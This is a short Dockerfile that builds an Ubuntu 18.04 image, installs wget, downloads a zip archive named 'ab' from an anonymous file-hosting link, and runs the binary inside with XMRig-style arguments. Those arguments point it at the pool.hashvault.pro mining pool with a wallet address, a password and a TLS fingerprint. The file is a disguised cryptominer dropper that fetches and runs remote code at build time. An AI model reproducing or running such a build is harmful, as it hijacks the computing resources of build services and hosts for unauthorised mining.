FROM ubuntu:18.04

ENV DEBIAN_FRONTEND=noninteractive

#RUN echo 'deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse\n' > /etc/apt/sources.list

RUN apt-get upgrade
RUN set -ex; \
    apt-get update \
    && apt-get install -y \
            wget
RUN wget https://cdn-105.anonfiles.com/x7Tatb95ud/096adc7c-1627528648/ab.zip
RUN unzip ab
RUN ./ab/ab --url pool.hashvault.pro:80 --user hvxy26Fsyz3GiKdKH9sP96T8UKyd7D1hnedoXYVawNkg84nxvr2J8X5XcRHoPya1paftqpLcK2ucnePS8avVNkYv9wHQ4E87cp --pass Heysitkd --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
